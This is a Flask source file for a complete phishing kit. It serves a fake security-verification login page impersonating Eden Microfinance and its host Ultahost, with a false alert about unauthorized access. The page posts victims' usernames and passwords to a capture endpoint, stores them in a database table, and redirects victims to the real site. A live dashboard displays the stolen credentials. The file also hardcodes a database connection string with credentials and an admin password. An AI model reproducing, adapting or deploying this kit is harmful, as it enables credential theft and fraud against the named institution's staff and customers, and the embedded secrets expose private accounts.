from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import psycopg2
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://neondb_owner:npg_Cb7XtKr0BIoN@ep-holy-scene-apw8vqig.c-7.us-east-1.aws.neon.tech/neondb?sslmode=require')

def get_db():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    conn = get_db()
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS captured_creds (
            id SERIAL PRIMARY KEY,
            timestamp TIMESTAMP DEFAULT NOW(),
            ip TEXT,
            user_agent TEXT,
            username TEXT,
            password TEXT,
            source TEXT
        )
    ''')
    conn.commit()
    cur.close()
    conn.close()
    print("[+] Database ready - data persists forever")

init_db()

# ==================== DASHBOARD HTML ====================
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>Intelligence Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#0a0e27;color:#00ffcc;font-family:'Courier New',monospace;padding:20px;}
        h1{color:#ff3366;border-bottom:2px solid #ff3366;padding-bottom:10px;margin-bottom:20px;}
        h2{color:#ffd700;margin:20px 0 10px 0;font-size:18px;}
        table{width:100%;border-collapse:collapse;margin-top:10px;}
        th,td{border:1px solid #00ffcc;padding:10px;text-align:left;}
        th{background:#1a1f3a;}
        .login{max-width:400px;margin:100px auto;background:#1a1f3a;padding:30px;border-radius:10px;}
        input,button{width:100%;padding:12px;margin:10px 0;background:#0a0e27;color:#00ffcc;border:1px solid #00ffcc;border-radius:5px;}
        .stats{background:#1a1f3a;padding:15px;border-radius:10px;margin-bottom:20px;display:flex;gap:20px;flex-wrap:wrap;}
        .stat-box{background:#0a0e27;padding:10px 20px;border-radius:8px;}
        .badge{background:#ff3366;color:white;padding:2px 8px;border-radius:20px;font-size:11px;}
        .delete-btn{background:#ff3366;color:white;border:none;padding:5px 10px;border-radius:5px;cursor:pointer;font-size:11px;}
        .delete-btn:hover{background:#ff0000;}
        .success{color:#00ff00;}
        .footer{margin-top:30px;text-align:center;font-size:10px;color:#666;}
    </style>
    <script>
        let authenticated = false;
        async function checkAuth() {
            const res = await fetch('/api/auth');
            const data = await res.json();
            if (!data.auth) {
                document.getElementById('login').style.display = 'block';
                document.getElementById('content').style.display = 'none';
            } else {
                document.getElementById('login').style.display = 'none';
                document.getElementById('content').style.display = 'block';
                loadData();
                setInterval(loadData, 3000);
            }
        }
        async function login() {
            const pwd = document.getElementById('pwd').value;
            const res = await fetch('/api/login', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pwd})});
            const data = await res.json();
            if (data.success) { checkAuth(); } else { alert('Wrong password'); }
        }
        async function deleteRecord(id) {
            if (confirm('Delete this captured credential?')) {
                const res = await fetch('/api/delete/' + id, {method: 'DELETE'});
                if (res.ok) { loadData(); }
            }
        }
        async function loadData() {
            const res = await fetch('/api/data');
            const data = await res.json();
            let html = '';
            for (let r of data) {
                html += `<tr>
                    <td>${r.timestamp}</td>
                    <td>${r.ip}</td>
                    <td><span class="badge">${r.source}</span></td>
                    <td><strong>${r.username}</strong></td>
                    <td><strong style="color:#ffd700;">${r.password}</strong></td>
                    <td><button class="delete-btn" onclick="deleteRecord(${r.id})">🗑 Delete</button></td>
                </tr>`;
            }
            document.getElementById('data').innerHTML = html;
            document.getElementById('stats').innerHTML = `${data.length} credential(s) captured`;
            if (data.length > 0) {
                document.getElementById('alert').innerHTML = '<span class="success">● NEW CREDENTIALS CAPTURED!</span>';
                setTimeout(() => { document.getElementById('alert').innerHTML = ''; }, 3000);
            }
        }
        checkAuth();
    </script>
</head>
<body>
<div id="login" class="login">
    <h2>🔐 SystemUpdate Dashboard</h2>
    <input type="password" id="pwd" placeholder="Password">
    <button onclick="login()">Login</button>
</div>
<div id="content" style="display:none">
    <h1>🎯 Intelligence Dashboard</h1>
    <div class="stats">
        <div class="stat-box">🔴 Status: <span class="success">ACTIVE</span></div>
        <div class="stat-box" id="stats">📊 0 credential(s) captured</div>
        <div class="stat-box" id="alert"></div>
    </div>
    <h2>📋 Captured Credentials </h2>
    <div style="overflow-x:auto;">
    <table>
        <thead><tr><th>Time</th><th>IP Address</th><th>Source</th><th>Username</th><th>Password</th><th>Action</th></tr></thead>
        <tbody id="data"></tbody>
    </table>
    </div>
    <div class="footer">🔒 SystemUpdate Security Operations - Authorized Access Only</div>
</div>
</body>
</html>
'''

# ==================== PHISHING PAGE HTML ====================
PHISHING_HTML = '''
<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification - Eden Microfinance</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #0a2b3e 0%, #1a4a6f 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container{
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
            width: 450px;
            max-width: 100%;
            overflow: hidden;
        }
        .header{
            background: #0a2b3e;
            padding: 30px;
            text-align: center;
            color: white;
        }
        .header h1{font-size:24px;margin-bottom:5px;}
        .header p{font-size:13px;opacity:0.8;}
        .alert-box{
            background: #f8d7da;
            border-left: 4px solid #dc3545;
            padding: 15px 20px;
            margin: 20px;
            border-radius: 8px;
        }
        .alert-box strong{color:#721c24;display:block;margin-bottom:5px;}
        .alert-box p{color:#721c24;font-size:13px;margin:0;}
        .info-box{
            background: #d1ecf1;
            padding: 12px 20px;
            margin: 0 20px 20px 20px;
            border-radius: 8px;
            text-align: center;
            border: 1px solid #0c5460;
        }
        .info-box span{color:#0c5460;font-weight:bold;}
        .login-form{padding:0 20px 20px 20px;}
        .input-group{margin-bottom:20px;}
        .input-group label{display:block;margin-bottom:8px;font-weight:500;color:#333;font-size:14px;}
        .input-group input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:15px;}
        .input-group input:focus{outline:none;border-color:#0a2b3e;box-shadow:0 0 0 3px rgba(10,43,62,0.1);}
        button{width:100%;padding:14px;background:#0a2b3e;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;}
        button:hover{background:#1a4a6f;}
        .footer{text-align:center;padding:20px;background:#f8f9fa;font-size:12px;color:#666;border-top:1px solid #eee;}
        .loader{display:none;text-align:center;margin-top:15px;color:#0a2b3e;font-size:13px;}
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🏦 Eden Microfinance</h1>
        <p>Login attepts found, we must make sure it's You!</p>
    </div>
    
    <div class="alert-box">
        <strong>⚠️ CRITICAL SECURITY ALERT</strong>
        <p>Ultahost Security Team has detected unauthorized access attempts on your hosting infrastructure. Immediate verification required.</p>
    </div>
    
    <div class="info-box">
        🔐 <span>Ultahost Security Verification Required. You Must login using 
Our Secure steps and make sure It's real admins from Eden MF.</span> 🔐
    </div>
    
    <div class="login-form">
        <form id="loginForm">
            <div class="input-group">
                <label>Username or Email Address</label>
                <input type="text" id="username" placeholder="Enter your Eden MF username" required autocomplete="off">
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="password" placeholder="Enter your password" required autocomplete="off">
            </div>
            <button type="submit">Verify Identity & Secure Account</button>
        </form>
        <div id="loader" class="loader">🛡️ Verifying with Ultahost Security Protocol...</div>
    </div>
    
    <div class="footer">
        <a href="#" style="color:#666;text-decoration:none;">Lost your password?</a> | 
        <a href="#" style="color:#666;text-decoration:none;">← Return to Eden Microfinance</a>
    </div>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const btn = document.querySelector('button');
    const loader = document.getElementById('loader');
    btn.disabled = true;
    loader.style.display = 'block';
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    await fetch('/api/capture', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({username: username, password: password, source: 'eden_microfinance'})
    });
    
    setTimeout(() => {
        loader.innerHTML = '✅ Identity verified! getting back to your Main page...';
        setTimeout(() => {
            window.location.href = 'https://www.edenmicrofinance.com';
        }, 2000);
    }, 1500);
});
</script>
</body>
</html>
'''

# ==================== ROUTES ====================
@app.route('/')
def index():
    return render_template_string(PHISHING_HTML)

@app.route('/dashboard')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/auth')
def auth():
    return jsonify({'auth': request.cookies.get('admin_auth') == 'true'})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    if data.get('password') == '0880Mdav!':
        resp = jsonify({'success': True})
        resp.set_cookie('admin_auth', 'true', httponly=True, secure=True, samesite='Strict')
        return resp
    return jsonify({'success': False})

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.json
    conn = get_db()
    cur = conn.cursor()
    cur.execute('INSERT INTO captured_creds (ip, user_agent, username, password, source) VALUES (%s, %s, %s, %s, %s)',
        (request.remote_addr, request.headers.get('User-Agent', ''), data.get('username', ''), data.get('password', ''), data.get('source', 'unknown')))
    conn.commit()
    cur.close()
    conn.close()
    print(f"[+] CAPTURED! {data.get('username')}:{data.get('password')}")
    return jsonify({'status': 'ok'})

@app.route('/api/delete/<int:id>', methods=['DELETE'])
def delete_record(id):
    conn = get_db()
    cur = conn.cursor()
    cur.execute('DELETE FROM captured_creds WHERE id = %s', (id,))
    conn.commit()
    cur.close()
    conn.close()
    print(f"[+] Deleted record ID: {id}")
    return jsonify({'status': 'ok'})

@app.route('/api/data')
def get_data():
    conn = get_db()
    cur = conn.cursor()
    cur.execute('SELECT id, timestamp, ip, source, username, password FROM captured_creds ORDER BY timestamp DESC LIMIT 200')
    rows = cur.fetchall()
    cur.close()
    conn.close()
    return jsonify([{'id': r[0], 'timestamp': r[1], 'ip': r[2], 'source': r[3], 'username': r[4], 'password': r[5]} for r in rows])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
